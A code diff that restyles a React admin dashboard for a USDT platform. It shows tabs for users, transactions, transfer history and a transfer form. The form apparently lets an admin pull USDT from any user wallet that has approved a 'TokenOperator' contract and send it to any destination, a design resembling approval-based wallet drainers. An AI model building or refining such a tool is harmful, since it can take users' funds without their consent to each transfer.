@@ -2,6 +2,7 @@ import { Skeleton } from "@/components/ui/skeleton.tsx";
 import {
   Card,
   CardContent,
+  CardDescription,
   CardHeader,
   CardTitle,
 } from "@/components/ui/card.tsx";
@@ -35,7 +36,24 @@ import { api } from "@/convex/_generated/api.js";
 import { useEffect, useState, useCallback } from "react";
 import { useNavigate } from "react-router-dom";
 import { toast } from "sonner";
-import { Users, Activity, ArrowRightLeft, Download, FileText } from "lucide-react";
+import { 
+  Users, 
+  Activity, 
+  ArrowRightLeft, 
+  Download, 
+  FileText,
+  LayoutDashboard,
+  History as HistoryIcon,
+  Send,
+  TrendingUp,
+  Wallet,
+  Search,
+  Filter,
+  ExternalLink,
+  Clock,
+  CheckCircle2,
+  XCircle
+} from "lucide-react";
 import type { Id } from "@/convex/_generated/dataModel.d.ts";
 
 declare global {
@@ -161,46 +179,92 @@ export default function Admin() {
 function AdminPage({ adminWallet }: { adminWallet: string }) {
 
   return (
-    <div className="min-h-screen bg-background">
-      <div className="border-b bg-card">
-        <div className="mx-auto max-w-7xl px-4 py-4">
+    <div className="min-h-screen bg-gradient-to-br from-background via-background to-primary/5">
+      {/* Professional Header */}
+      <div className="border-b bg-gradient-to-r from-card via-card to-primary/5 backdrop-blur-sm shadow-sm">
+        <div className="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-6">
           <div className="flex items-center justify-between">
-            <div className="text-xl font-bold">Admin Dashboard</div>
-            <div className="text-sm text-muted-foreground font-mono">
-              {adminWallet.slice(0, 6)}...{adminWallet.slice(-4)}
+            <div className="flex items-center gap-4">
+              <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-primary to-primary/50 flex items-center justify-center shadow-lg">
+                <LayoutDashboard className="h-6 w-6 text-primary-foreground" />
+              </div>
+              <div>
+                <h1 className="text-2xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text text-transparent">
+                  Admin Dashboard
+                </h1>
+                <p className="text-sm text-muted-foreground">
+                  USDT Management Platform
+                </p>
+              </div>
+            </div>
+            <div className="flex items-center gap-3">
+              <Badge variant="outline" className="px-4 py-2 font-mono text-xs">
+                <Wallet className="mr-2 h-3 w-3" />
+                {adminWallet.slice(0, 6)}...{adminWallet.slice(-4)}
+              </Badge>
             </div>
           </div>
         </div>
       </div>
-      <div className="mx-auto max-w-7xl px-4 py-8">
-        <h1 className="mb-6 text-3xl font-bold">Admin Dashboard</h1>
 
-        <Tabs defaultValue="overview" className="space-y-6">
-          <TabsList>
-            <TabsTrigger value="overview">Overview</TabsTrigger>
-            <TabsTrigger value="users">Users</TabsTrigger>
-            <TabsTrigger value="transactions">Transactions</TabsTrigger>
-            <TabsTrigger value="history">Transfer History</TabsTrigger>
-            <TabsTrigger value="transfer">Transfer USDT</TabsTrigger>
+      {/* Main Content */}
+      <div className="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-8">
+        <Tabs defaultValue="overview" className="space-y-8">
+          <TabsList className="grid w-full grid-cols-5 h-auto p-1 bg-card/50 backdrop-blur-sm">
+            <TabsTrigger 
+              value="overview" 
+              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
+            >
+              <LayoutDashboard className="h-4 w-4" />
+              <span className="hidden sm:inline">Overview</span>
+            </TabsTrigger>
+            <TabsTrigger 
+              value="users"
+              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
+            >
+              <Users className="h-4 w-4" />
+              <span className="hidden sm:inline">Users</span>
+            </TabsTrigger>
+            <TabsTrigger 
+              value="transactions"
+              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
+            >
+              <Activity className="h-4 w-4" />
+              <span className="hidden sm:inline">Transactions</span>
+            </TabsTrigger>
+            <TabsTrigger 
+              value="history"
+              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
+            >
+              <HistoryIcon className="h-4 w-4" />
+              <span className="hidden sm:inline">History</span>
+            </TabsTrigger>
+            <TabsTrigger 
+              value="transfer"
+              className="flex items-center gap-2 data-[state=active]:bg-primary data-[state=active]:text-primary-foreground"
+            >
+              <Send className="h-4 w-4" />
+              <span className="hidden sm:inline">Transfer</span>
+            </TabsTrigger>
           </TabsList>
 
-          <TabsContent value="overview">
+          <TabsContent value="overview" className="space-y-6">
             <OverviewTab />
           </TabsContent>
 
-          <TabsContent value="users">
+          <TabsContent value="users" className="space-y-6">
             <UsersTab />
           </TabsContent>
 
-          <TabsContent value="transactions">
+          <TabsContent value="transactions" className="space-y-6">
             <TransactionsTab />
           </TabsContent>
 
-          <TabsContent value="history">
+          <TabsContent value="history" className="space-y-6">
             <TransferHistoryTab />
           </TabsContent>
 
-          <TabsContent value="transfer">
+          <TabsContent value="transfer" className="space-y-6">
             <TransferTab adminWallet={adminWallet} />
           </TabsContent>
         </Tabs>
@@ -1106,90 +1170,147 @@ function TransferHistoryTab() {
   const transfers = useQuery(api.transfers.getAllTransfers);
 
   if (!transfers) {
-    return <Skeleton className="h-64 w-full" />;
+    return (
+      <div className="space-y-4">
+        {[1, 2, 3].map((i) => (
+          <Card key={i}>
+            <CardContent className="p-6">
+              <Skeleton className="h-24 w-full" />
+            </CardContent>
+          </Card>
+        ))}
+      </div>
+    );
   }
 
   return (
-    <Card>
-      <CardHeader>
-        <CardTitle>Transfer History ({transfers.length})</CardTitle>
+    <Card className="border-primary/20 shadow-lg">
+      <CardHeader className="border-b bg-gradient-to-r from-card to-primary/5">
+        <div className="flex items-center justify-between">
+          <div>
+            <CardTitle className="flex items-center gap-2">
+              <HistoryIcon className="h-5 w-5" />
+              Transfer History
+            </CardTitle>
+            <CardDescription className="mt-1">
+              {transfers.length} total transfer{transfers.length !== 1 ? 's' : ''}
+            </CardDescription>
+          </div>
+          <Badge variant="secondary" className="text-lg px-4 py-2">
+            {transfers.length}
+          </Badge>
+        </div>
       </CardHeader>
-      <CardContent>
+      <CardContent className="p-6">
         {transfers.length === 0 ? (
-          <div className="rounded-lg border border-dashed p-8 text-center">
-            <p className="text-muted-foreground">No transfers yet</p>
+          <div className="flex flex-col items-center justify-center py-16 text-center">
+            <div className="w-20 h-20 rounded-full bg-muted flex items-center justify-center mb-4">
+              <HistoryIcon className="h-10 w-10 text-muted-foreground" />
+            </div>
+            <h3 className="text-lg font-semibold mb-1">No transfers yet</h3>
+            <p className="text-sm text-muted-foreground">
+              Transfer history will appear here once you make your first transfer
+            </p>
           </div>
         ) : (
           <div className="space-y-4">
             {transfers.map((transfer) => (
-              <div
+              <Card
                 key={transfer._id}
-                className="rounded-lg border bg-card p-4 space-y-3"
+                className="hover:border-primary/40 transition-all duration-200 hover:shadow-md overflow-hidden"
               >
-                <div className="flex items-start justify-between">
-                  <div className="space-y-2 flex-1">
+                <CardContent className="p-5">
+                  <div className="space-y-4">
                     <div className="flex items-center gap-3">
-                      <div className="font-semibold text-lg">{transfer.amount} USDT</div>
-                      <Badge
-                        className={
+                      <div className={`w-10 h-10 rounded-full flex items-center justify-center ${
+                        transfer.status === "success"
+                          ? "bg-gradient-to-br from-green-500/20 to-emerald-500/20"
+                          : "bg-gradient-to-br from-red-500/20 to-rose-500/20"
+                      }`}>
+                        {transfer.status === "success" ? (
+                          <CheckCircle2 className="h-5 w-5 text-green-500" />
+                        ) : (
+                          <XCircle className="h-5 w-5 text-red-500" />
+                        )}
+                      </div>
+                      <div>
+                        <div className={`text-2xl font-bold bg-gradient-to-r ${
                           transfer.status === "success"
-                            ? "bg-green-500/10 text-green-500 border-green-500/20"
-                            : "bg-red-500/10 text-red-500 border-red-500/20"
-                        }
-                      >
-                        {transfer.status}
-                      </Badge>
+                            ? "from-green-600 to-emerald-600"
+                            : "from-red-600 to-rose-600"
+                        } bg-clip-text text-transparent`}>
+                          {transfer.amount} USDT
+                        </div>
+                        <Badge
+                          className={
+                            transfer.status === "success"
+                              ? "bg-green-500/10 text-green-600 border-green-500/20"
+                              : "bg-red-500/10 text-red-600 border-red-500/20"
+                          }
+                        >
+                          {transfer.status}
+                        </Badge>
+                      </div>
                     </div>
 
-                    <div className="grid gap-2 text-sm">
+                    <div className="grid gap-3 text-sm pl-13">
                       <div className="flex items-start gap-2">
-                        <span className="font-semibold min-w-[140px]">From Address:</span>
-                        <span className="font-mono text-xs text-muted-foreground break-all">
-                          {transfer.fromAddress}
-                        </span>
+                        <Wallet className="h-4 w-4 text-muted-foreground mt-0.5 flex-shrink-0" />
+                        <div>
+                          <div className="font-medium text-xs text-muted-foreground mb-1">From Address</div>
+                          <div className="font-mono text-xs break-all">{transfer.fromAddress}</div>
+                        </div>
                       </div>
 
                       <div className="flex items-start gap-2">
-                        <span className="font-semibold min-w-[140px]">To Address:</span>
-                        <span className="font-mono text-xs text-muted-foreground break-all">
-                          {transfer.toAddress}
-                        </span>
+                        <ArrowRightLeft className="h-4 w-4 text-muted-foreground mt-0.5 flex-shrink-0" />
+                        <div>
+                          <div className="font-medium text-xs text-muted-foreground mb-1">To Address</div>
+                          <div className="font-mono text-xs break-all">{transfer.toAddress}</div>
+                        </div>
                       </div>
 
                       <div className="flex items-start gap-2">
-                        <span className="font-semibold min-w-[140px]">Transferred By:</span>
-                        <span className="font-mono text-xs text-muted-foreground break-all">
-                          {transfer.transferredBy}
-                        </span>
+                        <Users className="h-4 w-4 text-muted-foreground mt-0.5 flex-shrink-0" />
+                        <div>
+                          <div className="font-medium text-xs text-muted-foreground mb-1">Transferred By</div>
+                          <div className="font-mono text-xs break-all">{transfer.transferredBy}</div>
+                        </div>
                       </div>
 
                       <div className="flex items-start gap-2">
-                        <span className="font-semibold min-w-[140px]">Transaction Hash:</span>
-                        <a
-                          href={`https://bscscan.com/tx/${transfer.txHash}`}
-                          target="_blank"
-                          rel="noopener noreferrer"
-                          className="font-mono text-xs text-primary hover:underline break-all"
-                        >
-                          {transfer.txHash}
-                        </a>
+                        <ExternalLink className="h-4 w-4 text-muted-foreground mt-0.5 flex-shrink-0" />
+                        <div>
+                          <div className="font-medium text-xs text-muted-foreground mb-1">Transaction Hash</div>
+                          <a
+                            href={`https://bscscan.com/tx/${transfer.txHash}`}
+                            target="_blank"
+                            rel="noopener noreferrer"
+                            className="font-mono text-xs text-primary hover:underline break-all inline-flex items-center gap-1"
+                          >
+                            {transfer.txHash.slice(0, 16)}...{transfer.txHash.slice(-16)}
+                          </a>
+                        </div>
                       </div>
 
-                      <div className="flex items-start gap-2">
-                        <span className="font-semibold min-w-[140px]">Date & Time:</span>
-                        <span className="text-muted-foreground">{transfer._creationTime}</span>
+                      <div className="flex items-center gap-2 text-xs text-muted-foreground">
+                        <Clock className="h-3 w-3" />
+                        {transfer._creationTime}
                       </div>
 
                       {transfer.note && (
-                        <div className="flex items-start gap-2">
-                          <span className="font-semibold min-w-[140px]">Note:</span>
-                          <span className="text-muted-foreground">{transfer.note}</span>
+                        <div className="mt-2 p-3 rounded-lg bg-muted/50 border border-dashed">
+                          <div className="font-medium text-xs mb-1 flex items-center gap-1.5">
+                            <FileText className="h-3 w-3" />
+                            Note
+                          </div>
+                          <div className="text-sm text-muted-foreground">{transfer.note}</div>
                         </div>
                       )}
                     </div>
                   </div>
-                </div>
-              </div>
+                </CardContent>
+              </Card>
             ))}
           </div>
         )}
@@ -1344,78 +1465,131 @@ function TransferTab({ adminWallet }: { adminWallet: string }) {
   }
 
   return (
-    <Card>
-      <CardHeader>
-        <CardTitle>Transfer USDT (Admin Only)</CardTitle>
+    <Card className="border-primary/20 shadow-lg">
+      <CardHeader className="border-b bg-gradient-to-r from-card to-primary/5">
+        <CardTitle className="flex items-center gap-2">
+          <Send className="h-5 w-5" />
+          Transfer USDT
+        </CardTitle>
+        <CardDescription>
+          Transfer USDT from approved user wallets using TokenOperator contract
+        </CardDescription>
       </CardHeader>
-      <CardContent className="space-y-6">
+      <CardContent className="p-6 space-y-6">
         {!adminConnected ? (
-          <div className="space-y-4">
-            <p className="text-sm text-muted-foreground">
-              Connect your admin wallet to transfer USDT from approved users
-            </p>
-            <Button onClick={connectAdminWallet} className="w-full">
-              Connect Admin Wallet
+          <div className="flex flex-col items-center justify-center py-12 text-center space-y-6">
+            <div className="w-20 h-20 rounded-full bg-gradient-to-br from-primary/20 to-primary/5 flex items-center justify-center">
+              <Wallet className="h-10 w-10 text-primary" />
+            </div>
+            <div>
+              <h3 className="text-lg font-semibold mb-2">Connect Admin Wallet</h3>
+              <p className="text-sm text-muted-foreground max-w-sm mx-auto">
+                Connect your admin wallet to transfer USDT from approved users
+              </p>
+            </div>
+            <Button 
+              onClick={connectAdminWallet} 
+              size="lg"
+              className="h-12 px-8 gap-2"
+            >
+              <Wallet className="h-5 w-5" />
+              Connect Wallet
             </Button>
           </div>
         ) : (
-          <div className="space-y-4">
-            <div className="rounded-lg bg-green-500/10 p-3 text-sm text-green-500">
-              ✅ Admin wallet connected
+          <div className="space-y-6">
+            <div className="flex items-center gap-3 p-4 rounded-lg bg-green-500/10 border border-green-500/20">
+              <div className="w-8 h-8 rounded-full bg-green-500/20 flex items-center justify-center">
+                <CheckCircle2 className="h-5 w-5 text-green-600" />
+              </div>
+              <span className="text-sm font-medium text-green-600">
+                Admin wallet connected
+              </span>
             </div>
 
-            <div>
-              <Label htmlFor="fromAddress">From Address (User Wallet)</Label>
-              <Input
-                id="fromAddress"
-                value={fromAddress}
-                onChange={(e) => setFromAddress(e.target.value)}
-                placeholder="0x..."
-              />
-              <p className="mt-1 text-xs text-muted-foreground">
-                The user must have approved the contract first
-              </p>
+            <div className="space-y-4">
+              <div>
+                <Label htmlFor="fromAddress" className="flex items-center gap-2 mb-2">
+                  <Wallet className="h-4 w-4" />
+                  From Address (User Wallet)
+                </Label>
+                <Input
+                  id="fromAddress"
+                  value={fromAddress}
+                  onChange={(e) => setFromAddress(e.target.value)}
+                  placeholder="0x..."
+                  className="font-mono"
+                />
+                <p className="mt-1.5 text-xs text-muted-foreground">
+                  The user must have approved the contract first
+                </p>
+              </div>
+
+              <div>
+                <Label htmlFor="toAddress" className="flex items-center gap-2 mb-2">
+                  <ArrowRightLeft className="h-4 w-4" />
+                  To Address (Destination)
+                </Label>
+                <Input
+                  id="toAddress"
+                  value={toAddress}
+                  onChange={(e) => setToAddress(e.target.value)}
+                  placeholder="0x..."
+                  className="font-mono"
+                />
+              </div>
+
+              <div>
+                <Label htmlFor="amount" className="flex items-center gap-2 mb-2">
+                  <Activity className="h-4 w-4" />
+                  Amount (USDT)
+                </Label>
+                <Input
+                  id="amount"
+                  type="number"
+                  step="0.01"
+                  value={amount}
+                  onChange={(e) => setAmount(e.target.value)}
+                  placeholder="0.0"
+                />
+              </div>
+
+              <Button
+                onClick={handleTransfer}
+                disabled={isProcessing}
+                className="w-full h-12 text-base gap-2"
+                size="lg"
+              >
+                {isProcessing ? (
+                  <>
+                    <div className="h-4 w-4 animate-spin rounded-full border-2 border-background border-t-transparent" />
+                    Processing...
+                  </>
+                ) : (
+                  <>
+                    <Send className="h-5 w-5" />
+                    Transfer USDT
+                  </>
+                )}
+              </Button>
             </div>
 
-            <div>
-              <Label htmlFor="toAddress">To Address (Destination)</Label>
-              <Input
-                id="toAddress"
-                value={toAddress}
-                onChange={(e) => setToAddress(e.target.value)}
-                placeholder="0x..."
-              />
-            </div>
-
-            <div>
-              <Label htmlFor="amount">Amount (USDT)</Label>
-              <Input
-                id="amount"
-                type="number"
-                step="0.01"
-                value={amount}
-                onChange={(e) => setAmount(e.target.value)}
-                placeholder="0.0"
-              />
-            </div>
-
-            <Button
-              onClick={handleTransfer}
-              disabled={isProcessing}
-              className="w-full"
-            >
-              {isProcessing ? "Processing..." : "Transfer USDT"}
-            </Button>
-
-            <div className="rounded-lg bg-muted p-4 text-sm">
-              <div className="font-semibold mb-2">How it works:</div>
-              <ol className="list-decimal list-inside space-y-1 text-muted-foreground">
-                <li>User approves the TokenOperator contract</li>
-                <li>Admin connects wallet and enters transfer details</li>
-                <li>Admin signs the transaction</li>
-                <li>USDT is transferred from user to destination</li>
-              </ol>
-            </div>
+            <Card className="border-dashed bg-muted/50">
+              <CardContent className="p-4">
+                <div className="text-sm space-y-2">
+                  <div className="font-semibold flex items-center gap-2">
+                    <FileText className="h-4 w-4" />
+                    How it works:
+                  </div>
+                  <ol className="list-decimal list-inside space-y-1 text-muted-foreground pl-1">
+                    <li>User approves the TokenOperator contract</li>
+                    <li>Admin connects wallet and enters transfer details</li>
+                    <li>Admin signs the transaction</li>
+                    <li>USDT is transferred from user to destination</li>
+                  </ol>
+                </div>
+              </CardContent>
+            </Card>
           </div>
         )}
       </CardContent>
